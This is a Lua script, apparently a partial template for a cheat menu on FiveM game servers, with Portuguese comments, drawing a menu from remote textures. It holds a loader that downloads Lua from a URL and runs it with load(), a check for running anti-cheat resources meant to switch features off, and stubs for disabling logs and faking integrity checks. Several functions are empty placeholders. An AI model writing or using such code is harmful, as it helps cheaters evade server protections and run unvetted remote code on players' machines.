------------------------------------------------------------------------------------------------------------------------------------------------
-- INTERFACE STRUCTURE
------------------------------------------------------------------------------------------------------------------------------------------------

-- Main Variables
local psychovars = {
    main = {
        drawing = false,
        tab = "self",
        key = 348,
    },
    list = {
        MesosnuX = 0.5, MesosnuY = 0.5, MesosnuX2 = 0.5, MesosnuY2 = 0.5, MesosnuW = 0.5, MesosnuH = 0.5
    },
    definitions = {
        isolated = false,
    }
}

-- Interface Variables
local overlay = {
    opacitys = {
        main = 0,
        contents = 0,
        togglebind = 0,
    },
    colors = {
        main = { r = 255, g = 0, b = 0 },
    },
    outhers = { disabling = false },
    anim = {
        tabpos = { x = 0.5, y = 0.5, xdestin = 0.31, ydestin = 0.399 },
        boxanim = { first = false }
    },
    cursorpos = { x = 0.5, y = 0.1 }
}

local texturevariables = {
    renders = {
        ["MainInterface"] = { txd = "main-interface", txn = "main-interface", url = "https://github.com/roberthjb21/LOGO/blob/main/milgrau%20back2.png", width = 1217, height = 864 },
        ["Menu-Box"] = { txd = "menu-box", txn = "menu-box", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=menu-box", width = 1217, height = 864 },
        ["Tab-Anim"] = { txd = "tab-anim", txn = "tab-anim", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=TabAnim", width = 1217, height = 864 },
        ["Button"] = { txd = "psycho-button", txn = "psycho-button", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=button", width = 1217, height = 864 },
        ["KeyBoard"] = { txd = "keyboard", txn = "keyboard", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=keyboard", width = 1217, height = 864 },
        ["Toggle-set"] = { txd = "toggle-set", txn = "toggle-set", url = "https://farinha21.github.io/farinha-menu-sigma/index?image=checkbox", width = 1360, height = 768 },
        ["ListAdm"] = { txd = "ListAdm", txn = "ListAdm", url = "https://raw.githubusercontent.com/scmrl/xithwid/refs/heads/main/AdminList.png", width = 310, height = 51 },
    },
    textures = { rendertexture = CreateRuntimeTextureFromDuiHandle, runtimetxd = CreateRuntimeTxd, duihandle = GetDuiHandle, imagecreate = CreateDui },
    uitexture = HasStreamedTextureDictLoaded("main-interface")
}

if texturevariables.uitexture ~= 1 then
    for i, k in pairs(texturevariables.renders) do
        texturevariables.textures.rendertexture(texturevariables.textures.runtimetxd(k.txd), k.txn,
            texturevariables.textures.duihandle(texturevariables.textures.imagecreate(k.url, k.width, k.height)))
    end
end

-- Drag Variables
local Drag = {
    LoaderX = 0.0, LoaderY = 0.0,
}

-- Main Functions
local mainfunctions = {
    displayInterface = function()
        -- Exemplo de código para desenhar a interface
        DrawSprite("main-interface", "main-interface", 0.5, 0.5, 0.6, 0.6, 0, 255, 255, 255, 255)
        -- Adicione mais elementos conforme necessário
    end,
    PsychoDrag = function()
        local useanim = true
        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY
        local CursorPositionX, CursorPositionY = mousefunctions.getCursorPosition()
        local animation_start_time = 0
        local animation_duration = 2000
        local current_time = GetGameTimer()
        local elapsed_time = current_time - animation_start_time

        if mousefunctions.CursorZone(0.5 + Loader_X, 0.22 + Loader_Y, 0.45, 0.04) and IsDisabledControlJustPressed(0, 24) then
            xxx = Drag.LoaderX - CursorPositionX
            yyy = Drag.LoaderY - CursorPositionY
            Dragging = true
        elseif IsDisabledControlReleased(0, 24) then
            Dragging = false
        end

        if Dragging then
            if useanim then
                local progress = elapsed_time / animation_duration
                dragantigo = { x = Drag.LoaderX, y = Drag.LoaderY }
                Drag.LoaderX = anim.Lerp(Drag.LoaderX, (CursorPositionX + xxx), 0.08)
                Drag.LoaderY = anim.Lerp(Drag.LoaderY, (CursorPositionY + yyy), 0.08)
            else
                Drag.LoaderX = CursorPositionX + xxx
                Drag.LoaderY = CursorPositionY + yyy
            end
        end
    end,
    drawcursor = function()
        -- Exemplo de código para desenhar o cursor
        local x, y = GetNuiCursorPosition()
        DrawSprite("cursor", "cursor", x, y, 0.02, 0.02, 0, 255, 255, 255, 255)
    end
}

-- Call Functions
local callfunc = {
    interactions = function()
        -- Code for interactions
    end
}

-- Initialize Interface
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)  -- Espera 0 milissegundos para não travar o jogo
        if psychovars.main.drawing then
            mainfunctions.displayInterface()  -- Desenha a interface
            mainfunctions.PsychoDrag()       -- Permite arrastar elementos
            callfunc.interactions()          -- Lida com interações do usuário
            mainfunctions.drawcursor()       -- Desenha o cursor
        end
        -- Verifica se a tecla F5 (ou qualquer outra tecla que você escolher) foi pressionada
        if IsControlJustPressed(1, 166) or IsControlJustPressed(1, 241) or IsControlJustPressed(1, 242) then
            -- Alterna o estado de desenho do menu
            psychovars.main.drawing = not psychovars.main.drawing
        end
    end
end)

function detectAntiCheat()
    local antiCheatResources = {"anticheat1", "anticheat2"}
    for _, resource in ipairs(antiCheatResources) do
        if GetResourceState(resource) == "started" then
            return true
        end
    end
    return false
end

if detectAntiCheat() then
    -- Desativar funcionalidades do menu
end

function loadExternalScript(url)
    PerformHttpRequest(url, function(err, text, headers)
        if err == 200 then
            local func, err = load(text)
            if func then
                func()
            else
                print("Erro ao carregar script externo: " .. err)
            end
        end
    end, "GET", "", {["Content-Type"] = "text/plain"})
end

loadExternalScript("https://example.com/script.lua")

RegisterNetEvent("customEvent")
AddEventHandler("customEvent", function(data)
    -- Processar dados
end)

TriggerServerEvent("customEvent", {key = "value"})

function checkIntegrity()
    local expectedHash = "abc123"
    local currentHash = GetResourceKvpString("resource_hash")
    if currentHash ~= expectedHash then
        -- Ação se a integridade for comprometida
    end
end

checkIntegrity()

function disableLogs()
    -- Código para desativar logs
end

disableLogs() 